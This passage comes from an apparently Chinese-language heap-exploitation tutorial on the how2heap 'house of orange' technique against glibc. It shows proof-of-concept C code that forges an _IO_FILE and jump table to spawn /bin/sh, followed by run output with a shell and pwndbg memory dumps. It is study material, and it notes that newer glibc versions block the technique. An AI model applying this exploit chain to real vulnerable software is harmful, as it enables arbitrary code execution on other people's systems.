they</span><br><span class="hljs-comment">      currently point to the libc&#x27;s main_arena.</span><br><span class="hljs-comment">    */</span><br><br>    io_list_all = top[<span class="hljs-number">2</span>] + <span class="hljs-number">0x9a8</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      //我们计划来覆盖现在依旧被放到unsorted bins中old top的fd和bk指针</span><br><span class="hljs-comment">      We plan to overwrite the fd and bk pointers of the old top,</span><br><span class="hljs-comment">      which has now been added to the unsorted bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //当malloc尝试通过分解free chunk来满足请求的时候,chunk-&gt;bk-&gt;fd的值将会被libc的main_arena中的unsorted-bin-list地址覆盖</span><br><span class="hljs-comment">      When malloc tries to satisfy a request by splitting this free chunk</span><br><span class="hljs-comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span><br><span class="hljs-comment">      in libc&#x27;s main_arena.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //注意,这个覆写发生在完整性检查之前,因此可以发生在任意情况下</span><br><span class="hljs-comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span><br><span class="hljs-comment">      case.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //在这里,我们要求chunk-&gt;bk-&gt;fd指向_IO_list_all</span><br><span class="hljs-comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span><br><span class="hljs-comment">      //因此,我们需要把chunk-&gt;bk设为_IO_list_all-16</span><br><span class="hljs-comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span><br><span class="hljs-comment">    */</span><br><br>    top[<span class="hljs-number">3</span>] = io_list_all - <span class="hljs-number">0x10</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      //在结尾的地方,system函数将会通过这个file指针来调用</span><br><span class="hljs-comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span><br><span class="hljs-comment">      //如果我们将前8个字节设为 /bin/sh,他就会相当于system(/bin/sh)</span><br><span class="hljs-comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-built_in">memcpy</span>( ( <span class="hljs-type">char</span> *) top, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      //_IO_flush_all_lockp函数遍历_IO_list_all指针链表</span><br><span class="hljs-comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span><br><span class="hljs-comment">      in _IO_list_all.</span><br><span class="hljs-comment">      //由于我们仅仅可以通过main_arena的unsorted-bin-list来覆写这个地址,因此方法就时在对应的fd-ptr处控制内存</span><br><span class="hljs-comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span><br><span class="hljs-comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span><br><span class="hljs-comment">      //下一个file指针在bass_address+0x68的位置</span><br><span class="hljs-comment">      The address of the next file pointer is located at base_address+0x68.</span><br><span class="hljs-comment">      //这个相对应的是smallbin-4,存储在90到98之间的smallbin的地方</span><br><span class="hljs-comment">      This corresponds to smallbin-4, which holds all the smallbins of</span><br><span class="hljs-comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span><br><span class="hljs-comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //由于我们溢出了旧的top chunk,我们也就可以控制他的size域了</span><br><span class="hljs-comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span><br><span class="hljs-comment">      //这也就会有一个棘手的问题,我们的old top chunk现在是在unsorted bin list中的,在每个分配中,malloc都会尝试首先为该列表中的chunk来提供服务</span><br><span class="hljs-comment">      //因此这也将会遍历该链表</span><br><span class="hljs-comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span><br><span class="hljs-comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span><br><span class="hljs-comment">      in this list first, therefore, iterates over the list.</span><br><span class="hljs-comment">      //此外,他也会把排序所有不符合的chunk并插入到对应的bins中去</span><br><span class="hljs-comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span><br><span class="hljs-comment">      //如果我们设置size为0x61并且触发一个不合适的更小的申请,malloc将会把old chunk放入到small bin-4中去</span><br><span class="hljs-comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span><br><span class="hljs-comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span><br><span class="hljs-comment">      //由于这个bin现在是空的,因此old top chunk将会变成新的头部</span><br><span class="hljs-comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span><br><span class="hljs-comment">      //因此,old top chunk占据了main_arena中smallbin[4]的位置,并最终代表了fake file的fd-pter指针</span><br><span class="hljs-comment">      therefore, occupying the smallbin[4] location in the main_arena and</span><br><span class="hljs-comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //除了分类外,malloc也会对他们做一些某些大小的检查</span><br><span class="hljs-comment">      In addition to sorting, malloc will also perform certain size checks on them,</span><br><span class="hljs-comment">      //所以在分类old_top chunk和在伪造的fd指针指向_IO_list_all之后,他将会检查size域,检查 size是否小于最小的&quot;size&lt;=2*SIZE_SZ&quot;的</span><br><span class="hljs-comment">      so after sorting the old top chunk and following the bogus fd pointer</span><br><span class="hljs-comment">      to _IO_list_all, it will check the corresponding size field, detect</span><br><span class="hljs-comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span><br><span class="hljs-comment">      //并且最终触发终止调用来得到我们的链</span><br><span class="hljs-comment">      and finally triggering the abort call that gets our chain rolling.</span><br><span class="hljs-comment">      Here is the corresponding code in the libc:</span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span><br><span class="hljs-comment">    */</span><br><br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0x61</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      //现在是我们满足函数_IO_flush_all_lockp所需的伪造文件指针约束并在此处进行测试的部分</span><br><span class="hljs-comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span><br><span class="hljs-comment">      required by the function _IO_flush_all_lockp and tested here:</span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //我们需要满足第一个状态</span><br><span class="hljs-comment">      We want to satisfy the first condition:</span><br><span class="hljs-comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment">    */</span><br><br>    _IO_FILE *fp = (_IO_FILE *) top;<br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span><br><span class="hljs-comment">    */</span><br><br>    fp-&gt;_mode = <span class="hljs-number">0</span>; <span class="hljs-comment">// top+0xc0</span><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment">    */</span><br><br>    fp-&gt;_IO_write_base = (<span class="hljs-type">char</span> *) <span class="hljs-number">2</span>; <span class="hljs-comment">// top+0x20</span><br>    fp-&gt;_IO_write_ptr = (<span class="hljs-type">char</span> *) <span class="hljs-number">3</span>; <span class="hljs-comment">// top+0x28</span><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     //最后我们设置jump table去控制内存并将system放到这儿</span><br><span class="hljs-comment">      4) Finally set the jump table to controlled memory and place system there.</span><br><span class="hljs-comment">      //jump_table指针是正好在_IO_FILE结构体后面的</span><br><span class="hljs-comment">      The jump table pointer is right after the _IO_FILE struct:</span><br><span class="hljs-comment">      base_address+sizeof(_IO_FILE) = jump_table</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">size_t</span> *jump_table = &amp;top[<span class="hljs-number">12</span>]; <span class="hljs-comment">// controlled memory</span><br>    jump_table[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) &amp;winner;<br>    *(<span class="hljs-type">size_t</span> *) ((<span class="hljs-type">size_t</span>) fp + <span class="hljs-built_in">sizeof</span>(_IO_FILE)) = (<span class="hljs-type">size_t</span>) jump_table; <span class="hljs-comment">// top+0xd8</span><br><br>    <span class="hljs-comment">//现在让我们用malloc来触发整个链</span><br>    <span class="hljs-comment">/* Finally, trigger the whole chain by calling malloc */</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">     The libc&#x27;s error message will be printed to the screen</span><br><span class="hljs-comment">     But you&#x27;ll get a shell anyways.</span><br><span class="hljs-comment">   */</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">winner</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">system</span>(ptr);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs 1c">The attack vector of this technique was removed by changing the behavior of malloc_printerr<span class="hljs-punctuation">,</span> which is no longer calling _IO_flush_all_lockp<span class="hljs-punctuation">,</span> in <span class="hljs-number">91</span>e7cf982d0104f0e71770f5ae8e3faf352dea9f <span class="hljs-punctuation">(</span><span class="hljs-number">2.26</span><span class="hljs-punctuation">)</span>.<br>Since glibc <span class="hljs-number">2.24</span> _IO_FILE vtable are checked against a whitelist breaking this exploit<span class="hljs-punctuation">,</span>https<span class="hljs-punctuation">:</span><span class="hljs-comment">//sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><br>*** Error in `./house_of_orange&#x27;: malloc(): memory corruption: 0x<span class="hljs-number">0000</span>7f83ceb<span class="hljs-number">5852</span>0 ***<br>======= Backtrace: =========<br>/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f83ce80a7e5]<br>/lib/x86_64-linux-gnu/libc.so.6(+0x<span class="hljs-number">8213</span>e)[0x7f83ce<span class="hljs-number">8151</span>3e]<br>/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f83ce<span class="hljs-number">817184</span>]<br>./house_of_orange[0x<span class="hljs-number">400788</span>]<br>/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f83ce7b<span class="hljs-number">3830</span>]<br>./house_of_orange[0x<span class="hljs-number">400589</span>]<br>======= Memory map: ========<br><span class="hljs-number">00400000-004010</span>00 r-xp <span class="hljs-number">00000000</span> fd:01 <span class="hljs-number">742055</span>                             /root/how2heap/glibc_2.25/house_of_orange<br><span class="hljs-number">00600000-006010</span>00 r--p <span class="hljs-number">00000000</span> fd:01 <span class="hljs-number">742055</span>                             /root/how2heap/glibc_2.25/house_of_orange<br><span class="hljs-number">00601000-006020</span>00 rw-p <span class="hljs-number">00001000</span> fd:01 <span class="hljs-number">742055</span>                             /root/how2heap/glibc_2.25/house_of_orange<br>009a<span class="hljs-number">8000-00</span>9eb000 rw-p <span class="hljs-number">00000000</span> 00:00 0                                  [heap]<br>7f83c<span class="hljs-number">800000</span>0-7f83c<span class="hljs-number">802100</span>0 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7f83c<span class="hljs-number">802100</span>0-7f83cc<span class="hljs-number">000000</span> ---p <span class="hljs-number">00000000</span> 00:00 0<br>7f83ce57d000-7f83ce<span class="hljs-number">593000</span> r-xp <span class="hljs-number">00000000</span> fd:01 <span class="hljs-number">183900</span>4                    /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7f83ce<span class="hljs-number">593000</span>-7f83ce<span class="hljs-number">792000</span> ---p <span class="hljs-number">00016000</span> fd:01 <span class="hljs-number">183900</span>4                    /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7f83ce<span class="hljs-number">792000</span>-7f83ce<span class="hljs-number">793000</span> rw-p <span class="hljs-number">00015000</span> fd:01 <span class="hljs-number">183900</span>4                    /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7f83ce<span class="hljs-number">793000</span>-7f83ce<span class="hljs-number">953000</span> r-xp <span class="hljs-number">00000000</span> fd:01 <span class="hljs-number">183898</span>3                    /lib/x86_64-linux-gnu/libc-2.23.so<br>7f83ce<span class="hljs-number">953000</span>-7f83ceb<span class="hljs-number">5300</span>0 ---p 001c<span class="hljs-number">0000</span> fd:01 <span class="hljs-number">183898</span>3                    /lib/x86_64-linux-gnu/libc-2.23.so<br>7f83ceb<span class="hljs-number">5300</span>0-7f83ceb<span class="hljs-number">5700</span>0 r--p 001c<span class="hljs-number">0000</span> fd:01 <span class="hljs-number">183898</span>3                    /lib/x86_64-linux-gnu/libc-2.23.so<br>7f83ceb<span class="hljs-number">5700</span>0-7f83ceb<span class="hljs-number">5900</span>0 rw-p 001c<span class="hljs-number">4000</span> fd:01 <span class="hljs-number">183898</span>3                    /lib/x86_64-linux-gnu/libc-2.23.so<br>7f83ceb<span class="hljs-number">5900</span>0-7f83ceb5d000 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7f83ceb5d000-7f83ceb<span class="hljs-number">8300</span>0 r-xp <span class="hljs-number">00000000</span> fd:01 <span class="hljs-number">183896</span>3                    /lib/x86_64-linux-gnu/ld-2.23.so<br>7f83ced<span class="hljs-number">7500</span>0-7f83ced<span class="hljs-number">7800</span>0 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7f83ced<span class="hljs-number">8100</span>0-7f83ced<span class="hljs-number">8200</span>0 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7f83ced<span class="hljs-number">8200</span>0-7f83ced<span class="hljs-number">8300</span>0 r--p <span class="hljs-number">00025000</span> fd:01 <span class="hljs-number">183896</span>3                    /lib/x86_64-linux-gnu/ld-2.23.so<br>7f83ced<span class="hljs-number">8300</span>0-7f83ced<span class="hljs-number">8400</span>0 rw-p <span class="hljs-number">00026000</span> fd:01 <span class="hljs-number">183896</span>3                    /lib/x86_64-linux-gnu/ld-2.23.so<br>7f83ced<span class="hljs-number">8400</span>0-7f83ced<span class="hljs-number">8500</span>0 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7ffd29f<span class="hljs-number">3300</span>0-7ffd29f<span class="hljs-number">5400</span>0 rw-p <span class="hljs-number">00000000</span> 00:00 0                          [stack]<br>7ffd29fb<span class="hljs-number">3000</span>-7ffd29fb<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 00:00 0                          [vdso]<br>ffffffffff<span class="hljs-number">600000</span>-ffffffffff<span class="hljs-number">601000</span> r-xp <span class="hljs-number">00000000</span> 00:00 0                  [vsyscall]<br># ls<br>a.out                      fastbin_dup_into_stack.c  house_of_force.c  house_of_orange.c  large_bin_attack.c    overlapping_chunks_2.c  unsafe_unlink          unsorted_bin_into_stack<br>fastbin_dup_consolidate    house_of_einherjar        house_of_lore     house_of_spirit    overlapping_chunks    poison_null_byte        unsafe_unlink.c        unsorted_bin_into_stack.c<br>fastbin_dup_consolidate.c  house_of_einherjar.c      house_of_lore.c   house_of_spirit.c  overlapping_chunks.c  poison_null_byte.c      unsorted_bin_attack<br>fastbin_dup_into_stack     house_of_force            house_of_orange   large_bin_attack   overlapping_chunks_2  un2.c                   unsorted_bin_attack.c<br></code></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>断点如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp">► <span class="hljs-number">72</span>     top = (<span class="hljs-type">size_t</span> *) ( (<span class="hljs-type">char</span> *) p1 + <span class="hljs-number">0x400</span> - <span class="hljs-number">16</span>);<br>  <span class="hljs-number">73</span>     top[<span class="hljs-number">1</span>] = <span class="hljs-number">0xc01</span>;<br><br>  <span class="hljs-number">118</span><br>► <span class="hljs-number">119</span>     p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><br>► <span class="hljs-number">155</span>     io_list_all = top[<span class="hljs-number">2</span>] + <span class="hljs-number">0x9a8</span>;<br><br>► <span class="hljs-number">172</span>     top[<span class="hljs-number">3</span>] = io_list_all - <span class="hljs-number">0x10</span>;<br><br>► <span class="hljs-number">179</span>     <span class="hljs-built_in">memcpy</span>( ( <span class="hljs-type">char</span> *) top, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">8</span>);<br><br>► <span class="hljs-number">211</span>     top[<span class="hljs-number">1</span>] = <span class="hljs-number">0x61</span>;<br><br>► <span class="hljs-number">222</span>     _IO_FILE *fp = (_IO_FILE *) top;<br><br>► <span class="hljs-number">229</span>     fp-&gt;_mode = <span class="hljs-number">0</span>; <span class="hljs-comment">// top+0xc0</span><br>  <br>► <span class="hljs-number">236</span>     fp-&gt;_IO_write_base = (<span class="hljs-type">char</span> *) <span class="hljs-number">2</span>; <span class="hljs-comment">// top+0x20</span><br>  <span class="hljs-number">237</span>     fp-&gt;_IO_write_ptr = (<span class="hljs-type">char</span> *) <span class="hljs-number">3</span>; <span class="hljs-comment">// top+0x28</span><br><br>► <span class="hljs-number">248</span>     <span class="hljs-type">size_t</span> *jump_table = &amp;top[<span class="hljs-number">12</span>]; <span class="hljs-comment">// controlled memory</span><br>  <span class="hljs-number">249</span>     jump_table[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) &amp;winner;<br>  <span class="hljs-number">250</span>     *(<span class="hljs-type">size_t</span> *) ((<span class="hljs-type">size_t</span>) fp + <span class="hljs-built_in">sizeof</span>(_IO_FILE)) = (<span class="hljs-type">size_t</span>) jump_table; <span class="hljs-comment">// top+0xd8</span><br><br>► <span class="hljs-number">254</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><br></code></pre></td></tr></table></figure><p>首先程序分配了p1(0x400-16),此时的堆和top chunk</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602400</span><br><span class="hljs-number">0x602400</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020c01</span><br><span class="hljs-number">0x602410</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602420</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602430</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602440</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>然后我们把top_chunk的size伪造成0xc01</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602400</span><br><span class="hljs-number">0x602400</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000c01</span><br><span class="hljs-number">0x602410</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602420</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602430</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602440</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>下面申请一个较大的chunk p2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x602400 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x602400<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>这个时候可以看到我们的旧top chunk已经被放到了unsorted bin中下面</p><p>紧接着程序计算了IO_LIST_ALL的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x &amp;_IO_list_all</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">7 = 0x7ffff7dd2520</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x io_list_all</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">8 = 0x7ffff7dd2520</span><br></code></pre></td></tr></table></figure><p>并将old chunk的bk指针指向了_io_list_ptr-0x10</p><p>然后给top的前八个字节设为了”&#x2F;bin&#x2F;sh\x00”</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x602400<br><span class="hljs-attribute">0x602400</span>:       <span class="hljs-number">0</span>x0068732f6e69622f      <span class="hljs-number">0</span>x0000000000000be1<br><span class="hljs-attribute">0x602410</span>:       <span class="hljs-number">0</span>x00007ffff7dd1b78      <span class="hljs-number">0</span>x00007ffff7dd2510<br><span class="hljs-attribute">0x602420</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x602430</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x602440</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0</span>x7fffffffe618 —▸ <span class="hljs-number">0</span>x602400 ◂— <span class="hljs-number">0</span>x68732f6e69622f /* &#x27;/bin/sh&#x27; */<br><br></code></pre></td></tr></table></figure><p>现在我们把size设为0x61</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602400</span><br><span class="hljs-number">0x602400</span>:       <span class="hljs-number">0</span>x0068732f6e69622f      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000061</span><br><span class="hljs-number">0x602410</span>:       <span class="hljs-number">0</span>x00007ffff7dd1b78      <span class="hljs-number">0</span>x00007ffff7dd2510<br><span class="hljs-number">0x602420</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602430</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602440</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>之后程序对我们的旧的top chunk做了对绕过检测的改写,先将mode改为0</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sqf">$<span class="hljs-number">20</span> = &#123;<br>  <span class="hljs-variable">_flags</span> = <span class="hljs-number">1852400175</span>,<br>  <span class="hljs-variable">_IO_read_ptr</span> = <span class="hljs-number">0</span>x61 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x61&gt;,<br>  <span class="hljs-variable">_IO_read_end</span> = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt; <span class="hljs-string">&quot;\020@b&quot;</span>,<br>  <span class="hljs-variable">_IO_read_base</span> = <span class="hljs-number">0</span>x7ffff7dd2510 <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-variable">_IO_write_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_write_ptr</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_write_end</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_buf_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_buf_end</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_save_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_backup_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_save_end</span> = <span class="hljs-number">0</span>x0,<br>  <span 